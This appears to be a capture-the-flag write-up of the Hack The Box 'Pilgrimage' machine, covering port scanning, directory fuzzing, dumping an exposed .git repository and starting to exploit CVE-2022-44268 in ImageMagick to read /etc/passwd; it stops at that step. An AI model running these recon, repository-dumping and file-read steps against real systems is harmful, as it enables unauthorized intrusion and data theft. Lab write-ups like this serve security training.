# Box: Pilgrimage
# Level: Easy
# OS: Linux
<hr>

Lets get started

# Recon

## Portscanning

command:```sudo nmap -A 10.10.11.219 -T4  -v -p-```

```
Nmap scan report for 10.10.11.219
Host is up (0.24s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20be60d295f628c1b7e9e81706f168f3 (RSA)
|   256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA)
|_  256 d14e293c708669b4d72cc80b486e9804 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=10/1%OT=22%CT=1%CU=32552%PV=Y%DS=2%DC=T%G=Y%TM=6519C8A
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST11
OS:NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Uptime guess: 0.689 days (since Sun Oct  1 03:56:58 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=254 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT       ADDRESS
1   338.32 ms 10.10.14.1
2   338.37 ms 10.10.11.219

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct  1 20:29:46 2023 -- 1 IP address (1 host up) scanned in 1089.91 seconds
```
From our nmap scan we have 2 open ports. Port 22 which runs the ssh service and port 80 which runs the http service. Our enumeration today will be focused on port 80.



# Enumeration

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fee92d11-c453-45f2-ae24-e1a55f04abd6)

Add that to your ```/etc/hosts``` file

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/pilgrimage]
└─$ sudo nano /etc/hosts
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/pilgrimage]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       bl4ck4non

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

10.10.11.219 pilgrimage.htb
```
Now refresh the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c602636d-a9a7-495c-a8c1-6a998765077b)

The page is now accessible. Lets register an account

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d63a9176-5266-4468-84bc-97b46281ef36)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/58ce2a2e-a0e5-4cf9-98d9-d2c8a35a387f)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2a7426b7-ef6a-45ae-88cc-69e3ce87a04b)

This is an upload page, where we can upload our jpegs and it gets it shrinked down for us. Now, this upload function doesn't allow other extensions, it's strictly ```jpeg``` and ```png``` files.

Lets fuzz for directories using ```ffuf```

command:```ffuf -u "http://pilgrimage.htb/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup```

```
┌──(bl4ck4non㉿bl4ck4non)-[~]
└─$ ffuf -u "http://pilgrimage.htb/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://pilgrimage.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .zip .sql .php .phtml .bak .backup 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 304ms]
assets                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 263ms]
dashboard.php           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 308ms]
index.php               [Status: 200, Size: 7621, Words: 2051, Lines: 199, Duration: 307ms]
index.php               [Status: 200, Size: 7621, Words: 2051, Lines: 199, Duration: 307ms]
login.php               [Status: 200, Size: 6166, Words: 1648, Lines: 172, Duration: 307ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 306ms]
register.php            [Status: 200, Size: 6173, Words: 1646, Lines: 172, Duration: 309ms]
tmp                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 294ms]
vendor                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 307ms]
:: Progress: [32305/32305] :: Job [1/1] :: 134 req/sec :: Duration: [0:03:55] :: Errors: 0 ::
```
We have quite a lot of directory here. The most interesting one is the ```.git``` directory. Lets navigate to the directory to see what's there

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/40216ebb-7069-4bb3-b184-3241db323d85)

oops, we got a 403 error🥲.

Now, this site has an exposed ```.git``` repository. Well, we can try to dump this ```.git``` repository.

We can use the tool ```git-dumper``` to do this

To install
```
python -m venv venv
source venv/bin/activate
pip3 install git-dumper
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/78f535cc-248b-4c56-8a16-27df5c352657)

Successfully installed. 

```
┌──(venv)─(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/pilgrimage]
└─$ git-dumper -h                                                                                                     
usage: git-dumper [options] URL DIR

Dump a git repository from a website.

positional arguments:
  URL                   url
  DIR                   output directory

options:
  -h, --help            show this help message and exit
  --proxy PROXY         use the specified proxy
  -j JOBS, --jobs JOBS  number of simultaneous requests
  -r RETRY, --retry RETRY
                        number of request attempts before giving up
  -t TIMEOUT, --timeout TIMEOUT
                        maximum time in seconds before giving up
  -u USER_AGENT, --user-agent USER_AGENT
                        user-agent to use for requests
  -H HEADER, --header HEADER
                        additional http headers, e.g `NAME=VALUE`
```
So, we can specify the url and also the directory we want the result to be outputted to

command:```git-dumper http://pilgrimage.htb/.git output```

So, ```output``` will be the folder I want the output of the command to be saved to

```
┌──(venv)─(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/pilgrimage]                                                                                                                                   
└─$ git-dumper http://pilgrimage.htb/.git output                                                                                                                                                
[-] Testing http://pilgrimage.htb/.git/HEAD [200]                                                                                                                                               
[-] Testing http://pilgrimage.htb/.git/ [403]                                                                                                                                                   
[-] Fetching common files                                                                                                                                                                       
[-] Fetching http://pilgrimage.htb/.gitignore [404]                                                                                                                                             
[-] http://pilgrimage.htb/.gitignore responded with status code 404                                                                                                                             
[-] Fetching http://pilgrimage.htb/.git/description [200]                                                                                                                                       
[-] Fetching http://pilgrimage.htb/.git/hooks/post-update.sample [200]                                                                                                                          
[-] Fetching http://pilgrimage.htb/.git/COMMIT_EDITMSG [200]                                                                                                                                    
[-] Fetching http://pilgrimage.htb/.git/hooks/post-commit.sample [404]                                                                                                                          
[-] http://pilgrimage.htb/.git/hooks/post-commit.sample responded with status code 404                                                                                                          
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-commit.sample [200]                                                                                                                           
[-] Fetching http://pilgrimage.htb/.git/hooks/applypatch-msg.sample [200]                                                                                                                       
[-] Fetching http://pilgrimage.htb/.git/hooks/commit-msg.sample [200]                                                                                                                           
[-] Fetching http://pilgrimage.htb/.git/hooks/post-receive.sample [404]                                                                                                                         
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-applypatch.sample [200]                                                                                                                       
[-] http://pilgrimage.htb/.git/hooks/post-receive.sample responded with status code 404                                                                                                         
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-push.sample [200]                                                                                                                             
[-] Fetching http://pilgrimage.htb/.git/hooks/update.sample [200]                                                                                                                               
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-receive.sample [200]                                                                                                                          
[-] Fetching http://pilgrimage.htb/.git/info/exclude [200]

.....

[-] Fetching http://pilgrimage.htb/.git/objects/81/703757c43fe30d0f3c6157a1c20f0fea7331fc [200]
[-] Fetching http://pilgrimage.htb/.git/objects/ca/d9dfca08306027b234ddc2166c838de9301487 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/23/1150acdd01bbbef94dfb9da9f79476bfbb16fc [200]
[-] Fetching http://pilgrimage.htb/.git/objects/f1/8fa9173e9f7c1b2f30f3d20c4a303e18d88548 [200]
[-] Running git checkout .
```
Checking the ```output``` directory

```
┌──(venv)─(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/pilgrimage]
└─$ ls -la
total 20
drwxr-xr-x  4 bl4ck4non bl4ck4non 4096 Oct  2 08:06 .
drwxr-xr-x 37 bl4ck4non bl4ck4non 4096 Oct  1 20:09 ..
drwxr-xr-x  5 bl4ck4non bl4ck4non 4096 Oct  2 08:06 output
-rw-r--r--  1 root      root      2053 Oct  1 20:29 pilgrimage
drwxr-xr-x  5 bl4ck4non bl4ck4non 4096 Oct  2 08:01 venv
                                                                                                                                                                                                
┌──(venv)─(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/pilgrimage]
└─$ cd output 
                                                                                                                                                                                                
┌──(venv)─(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/pilgrimage/output]
└─$ ls -la
total 26972
drwxr-xr-x 5 bl4ck4non bl4ck4non     4096 Oct  2 08:06 .
drwxr-xr-x 4 bl4ck4non bl4ck4non     4096 Oct  2 08:06 ..
drwxr-xr-x 6 bl4ck4non bl4ck4non     4096 Oct  2 08:06 assets
-rwxr-xr-x 1 bl4ck4non bl4ck4non     5538 Oct  2 08:06 dashboard.php
drwxr-xr-x 7 bl4ck4non bl4ck4non     4096 Oct  2 08:06 .git
-rwxr-xr-x 1 bl4ck4non bl4ck4non     9250 Oct  2 08:06 index.php
-rwxr-xr-x 1 bl4ck4non bl4ck4non     6822 Oct  2 08:06 login.php
-rwxr-xr-x 1 bl4ck4non bl4ck4non       98 Oct  2 08:06 logout.php
-rwxr-xr-x 1 bl4ck4non bl4ck4non 27555008 Oct  2 08:06 magick
-rwxr-xr-x 1 bl4ck4non bl4ck4non     6836 Oct  2 08:06 register.php
drwxr-xr-x 4 bl4ck4non bl4ck4non     4096 Oct  2 08:06 vendor
```
we now have access to the source code ```index.php```. Reading the source code I found this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/778c359b-3952-4760-81a0-74c602e4d0c2)

The code snippet executes the ImageMagick "convert" command on files located in the "/var/www/pilgrimage.htb/tmp/" directory.

We got the ```magick``` executable on our machine when we dumped the ```.git``` repository

```
┌──(venv)─(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/pilgrimage/output]
└─$ ls -l magick            
-rwxr-xr-x 1 bl4ck4non bl4ck4non 27555008 Oct  2 08:06 magick
                                                                                                                                                                                                
┌──(venv)─(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/pilgrimage/output]
└─$ file magick                                                                                                       
magick: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9fdbc145689e0fb79cb7291203431012ae8e1911, stripped
                                                                                                                                                                                                
┌──(venv)─(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/pilgrimage/output]
└─$ ./magick          
Error: Invalid argument or not enough arguments

Usage: magick tool [ {option} | {image} ... ] {output_image}
Usage: magick [ {option} | {image} ... ] {output_image}
       magick [ {option} | {image} ... ] -script {filename} [ {script_args} ...]
       magick -help | -version | -usage | -list {option}
```
Checking the version of this executable, I found something interesting

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0d5aa9b0-1156-4bba-8904-925170faf274)

Well, that version has a public exploit. Lets exploit




# Exploitation

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8946854f-e84c-4304-89f3-50f5428ff15b)

So, it has an arbitrary file upload vulnerability. You can find the POC [here](https://github.com/voidz0r/CVE-2022-44268)

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4ad82b0d-115d-4a48-9ef0-0beae92368e3)

This is how to use the tool

Lets clone this repo to our machine

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/pilgrimage]
└─$ git clone https://github.com/voidz0r/CVE-2022-44268
Cloning into 'CVE-2022-44268'...
remote: Enumerating objects: 30, done.
remote: Counting objects: 100% (30/30), done.
remote: Compressing objects: 100% (25/25), done.
remote: Total 30 (delta 8), reused 17 (delta 2), pack-reused 0
Receiving objects: 100% (30/30), 954.74 KiB | 238.00 KiB/s, done.
Resolving deltas: 100% (8/8), done.
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/pilgrimage]
└─$ cd CVE-2022-44268 
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/pilgrimage/CVE-2022-44268]
└─$ ls    
Cargo.lock  Cargo.toml  image.png  README.md  screens  src
```
To install cargo, run the command ```sudo apt get cargo```

After installing, run ```cargo run "/etc/passwd```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/40823405-1348-4b00-a84f-3a3d61ea357b)


























